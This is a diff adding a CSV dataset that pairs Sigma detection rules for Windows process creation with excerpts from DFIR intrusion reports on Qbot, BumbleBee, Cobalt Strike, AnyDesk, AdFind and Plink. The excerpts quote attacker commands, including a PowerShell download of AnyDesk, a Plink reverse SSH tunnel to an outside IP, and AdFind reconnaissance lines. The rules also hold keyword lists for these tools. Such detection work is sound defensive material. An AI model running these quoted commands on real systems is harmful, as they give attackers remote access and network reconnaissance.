@@ -1,0 +1,216 @@
+Filename,Excerpts from DFIR Report,LogSource and Detection
+proc_creation_win_regsvr32_remote_share.yml,"Qbot DLLs were created remotely from the beachhead host and saved in the administrative C$ share of other hosts within the network. Zeek SMB file data confirmed the file transfers. A local service was registered on targeted systems to execute the Qbot DLL using regsvr32.exe. Suricata signatures identified the remote file creation and service registration: ET RPC DCERPC SVCCTL - Remote Service Control Manager Access and ET POLICY SMB Executable File Transfer.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\regsvr32.exe'
+        - OriginalFileName: '\REGSVR32.EXE'
+    selection_cli:
+        CommandLine|contains: ' \\\\'
+    condition: all of selection_*"
+proc_creation_win_regsvr32_susp_extensions.yml,"Initial access involved a weaponized Microsoft Word document with a macro that downloaded a binary file compareForFor.jpg to c:\users\public and used REGSVR32 to execute this DLL. The downloaded file was actually a DLL despite the .jpg extension. The DLL was loaded via RunDll32 process with two DLLs loaded: D574.dll and D8B3.dll. D8B3.dll was injected into the Winlogon process at high integrity. Suspicious characteristics included invalid certificates for the DLLs, no populated metadata for the DLLs, and unusual process hierarchy during execution.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\regsvr32.exe'
+        - OriginalFileName: 'REGSVR32.EXE'
+    selection_cli:
+        CommandLine|endswith:
+            - '.bin'
+            - '.bmp'
+            - '.cr2'
+            - '.dat'
+            - '.eps'
+            - '.gif'
+            - '.ico'
+            - '.jpeg'
+            - '.jpg'
+            - '.nef'
+            - '.orf'
+            - '.png'
+            - '.raw'
+            - '.sr2'
+            - '.temp'
+            - '.tif'
+            - '.tiff'
+            - '.tmp'
+            - '.rtf'
+            - '.txt'
+    condition: all of selection_*"
+proc_creation_win_remote_access_tools_anydesk_susp_exec.yml,"Threat actor downloaded AnyDesk using PowerShell: powershell -c (New-Object Net.WebClient).DownloadFile('http://download.anydesk.com/AnyDesk.msi', 'AnyDesk.msi'). A service was installed to ensure AnyDesk remained available after server restarts with Windows System event 7045 showing service creation with AnyDeskMSI.exe set to auto-start. Connected via IP 92.51.2[.]27 with hostname WIN-EKIHV2OQQP8. AnyDesk was configured with a preset password and provided the threat actor with persistent remote access to drop tools, enumerate infrastructure, access credentials, and exfiltrate and encrypt data.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith:
+              - '\AnyDesk.exe'
+              - '\AnyDeskMSI.exe'
+        - Description: AnyDesk
+        - Product: AnyDesk
+        - Company: AnyDesk Software GmbH
+    filter:
+        Image|contains:
+            - '\AppData\'
+            - 'Program Files (x86)\AnyDesk'
+            - 'Program Files\AnyDesk'
+    condition: selection and not filter"
+proc_creation_win_remote_access_tools_anydesk.yml,"Threat actor downloaded AnyDesk using PowerShell: powershell -c (New-Object Net.WebClient).DownloadFile('http://download.anydesk.com/AnyDesk.msi', 'AnyDesk.msi'). A service was installed to ensure AnyDesk remained available after server restarts with Windows System event 7045 showing service creation with AnyDeskMSI.exe set to auto-start. Connected via IP 92.51.2[.]27 with hostname WIN-EKIHV2OQQP8. AnyDesk was configured with a preset password and provided the threat actor with persistent remote access to drop tools, enumerate infrastructure, access credentials, and exfiltrate and encrypt data.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith:
+              - '\AnyDesk.exe'
+              - '\AnyDeskMSI.exe'
+        - Description: AnyDesk
+        - Product: AnyDesk
+        - Company: AnyDesk Software GmbH
+    condition: selection"
+proc_creation_win_renamed_adfind.yml,"AdFind continues to be seen across majority of breaches and is used for domain trust discovery to plan out subsequent steps in the attack chain. Threat actors use AdFind for gathering network information including person objects, computer systems, domain trusts, subnets, and domain controllers. Observed commands from previous reports include: adfind.exe -gcb -sc trustdmp, adfind.exe -f (objectcategory=group), adfind.exe -subnets -f (objectCategory=subnet), adfind.exe -f (objectcategory=organizationalUnit), adfind.exe -f objectcategory=computer, adfind.exe -f (objectcategory=person).","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_1:
+        CommandLine|contains:
+            - 'domainlist'
+            - 'trustdmp'
+            - 'dcmodes'
+            - 'adinfo'
+            - ' dclist '
+            - 'computer_pwdnotreqd'
+            - 'objectcategory='
+            - '-subnets -f'
+            - 'name=""Domain Admins""'
+            - '-sc u:'
+            - 'domainncs'
+            - 'dompol'
+            - ' oudmp '
+            - 'subnetdmp'
+            - 'gpodmp'
+            - 'fspdmp'
+            - 'users_noexpire'
+            - 'computers_active'
+            - 'computers_pwdnotreqd'
+    selection_2:
+        Hashes|contains:
+            - 'IMPHASH=BCA5675746D13A1F246E2DA3C2217492'
+            - 'IMPHASH=53E117A96057EAF19C41380D0E87F1C2'
+            - 'IMPHASH=d144de8117df2beceaba2201ad304764'
+            - 'IMPHASH=12ce1c0f3f5837ecc18a3782408fa975'
+            - 'IMPHASH=4fbf3f084fbbb2470b80b2013134df35'
+            - 'IMPHASH=49b639b4acbecc49d72a01f357aa4930'
+            - 'IMPHASH=680dad9e300346e05a85023965867201'
+            - 'IMPHASH=21aa085d54992511b9f115355e468782'
+    selection_3:
+        OriginalFileName: 'AdFind.exe'
+    filter:
+        Image|endswith: '\AdFind.exe'
+    condition: 1 of selection* and not filter"
+proc_creation_win_renamed_autohotkey.yml,"Threat actors used AutoHotkey (AHK) as part of their keylogging strategy by renaming the AutoHotkey executable to module.exe. The executable module.exe is a renamed binary of AutoHotkey executed with a script named module.ahk. Purpose was to create a keylogger that captured keyboard layout, recorded pressed keys, and saved keystrokes to a registry key. Execution command: module.exe was run with module.ahk as a command-line parameter. A scheduled task named MicrosoftEdgeUpdateTaskMachineUC was created to run the keylogger for persistence.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Product|contains: 'AutoHotkey'
+        - Description|contains: 'AutoHotkey'
+        - OriginalFileName:
+              - 'AutoHotkey.exe'
+              - 'AutoHotkey.rc'
+    filter:
+        - Image|endswith:
+              - '\AutoHotkey.exe'
+              - '\AutoHotkey32.exe'
+              - '\AutoHotkey32_UIA.exe'
+              - '\AutoHotkey64.exe'
+              - '\AutoHotkey64_UIA.exe'
+              - '\AutoHotkeyA32.exe'
+              - '\AutoHotkeyA32_UIA.exe'
+              - '\AutoHotkeyU32.exe'
+              - '\AutoHotkeyU32_UIA.exe'
+              - '\AutoHotkeyU64.exe'
+              - '\AutoHotkeyU64_UIA.exe'
+        - Image|contains: '\AutoHotkey'
+    condition: selection and not filter"
+proc_creation_win_renamed_pingcastle.yml,"PingCastle was used by the threat actor as an Active Directory auditing tool during their intrusion. The tool was executed on a domain controller with the command: pingcastle.exe --healthcheck --level Full. PingCastle is described as an active directory auditing tool used for reconnaissance and security assessment purposes. The threat actor ran this tool as part of their discovery phase, likely to gather information about the Active Directory environment's security configuration and potential vulnerabilities.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - OriginalFileName:
+              - 'PingCastleReporting.exe'
+              - 'PingCastleCloud.exe'
+              - 'PingCastle.exe'
+        - CommandLine|contains:
+              - '--scanner aclcheck'
+              - '--scanner antivirus'
+              - '--scanner computerversion'
+              - '--scanner foreignusers'
+              - '--scanner laps_bitlocker'
+              - '--scanner localadmin'
+              - '--scanner nullsession'
+              - '--scanner nullsession-trust'
+              - '--scanner oxidbindings'
+              - '--scanner remote'
+              - '--scanner share'
+              - '--scanner smb'
+              - '--scanner smb3querynetwork'
+              - '--scanner spooler'
+              - '--scanner startup'
+              - '--scanner zerologon'
+        - CommandLine|contains: '--no-enum-limit'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--level Full'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--server '
+    filter_main_img:
+        Image|endswith:
+            - '\PingCastleReporting.exe'
+            - '\PingCastleCloud.exe'
+            - '\PingCastle.exe'
+    condition: selection and not 1 of filter_main_*"
+proc_creation_win_renamed_plink.yml,"Threat actor downloaded a file named ekern.exe which was actually a renamed version of Plink. They used a batch script FXS.bat to establish SSH connections for port forwarding. Key command used: echo y | c:\Windows\temp\ekern.exe -ssh -P 443 -l admin1 -pw [password] -R 23.81.246.84:49800:127.0.0.1:3389 23.81.246.84. Renamed Plink to ekern.exe to stay under the radar, forwarded RDP traffic through SSH tunnel, and used non-standard port 443 for SSH connection. The tunneling allowed establishing reverse SSH connections, creating RDP access to internal servers, and proxying traffic between their server and target hosts. The name ekern.exe was chosen to resemble a legitimate ESET component.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - OriginalFileName: 'Plink'
+        - CommandLine|contains|all:
+              - ' -l forward'
+              - ' -P '
+              - ' -R '
+    filter:
+        Image|endswith: '\plink.exe'
+    condition: selection and not filter"
+proc_creation_win_rundll32_dllregisterserver.yml,"After dropping 1.dll (Cobalt Strike) on the domain controller, the threat actor executed it using: rundll32.exe 1.dll, DllRegisterServer. This command was used to register or execute the Cobalt Strike DLL on the compromised domain controller. The execution method suggests an attempt to load and initialize the malicious DLL using the standard Windows DLL registration mechanism.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_image:
+        - Image|endswith: '\rundll32.exe'
+        - OriginalFileName: 'RUNDLL32.EXE'
+    selection_cmdline:
+        CommandLine|contains: 'DllRegisterServer'
+    filter_main_legit_paths:
+        CommandLine|contains:
+            - ':\Program Files (x86)'
+            - ':\Program Files\'
+            - ':\Windows\System32\'
+            - ':\Windows\SysWOW64\'
+    condition: all of selection_* and not 1 of filter_main_*"
+proc_creation_win_rundll32_parent_explorer.yml,"The BumbleBee malware was executed via rundll32.exe with the command: C:\Windows\System32\rundll32.exe tamirlan.dll,EdHVntqdWt. The malware used WMI and COM function calls to start processes, specifically targeting three potential injection processes: C:\Program Files\Windows Mail\wabmig.exe, C:\Program Files\Windows Mail\wab.exe, and C:\Program Files\Windows Photo Viewer\ImagingDevices.exe. Processes spawned were not direct child processes of rundll32 but instead children of WmiPrvSE.exe. The malware used CreateRemoteThread to execute code in rundll32.exe and created named pipes for inter-process communication. This technique helps evade parent/child process heuristics and allows injecting code into legitimate processes.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent:
+        ParentImage|endswith: '\explorer.exe'
+    selection_img:
+        - Image|endswith: '\rundll32.exe'
+        - OriginalFileName: 'RUNDLL32.EXE'
+    filter_main_generic:
+        - CommandLine|contains: ' C:\Windows\System32\'
+        - CommandLine|endswith: ' -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617'
+    condition: all of selection_* and not 1 of filter_main_*"
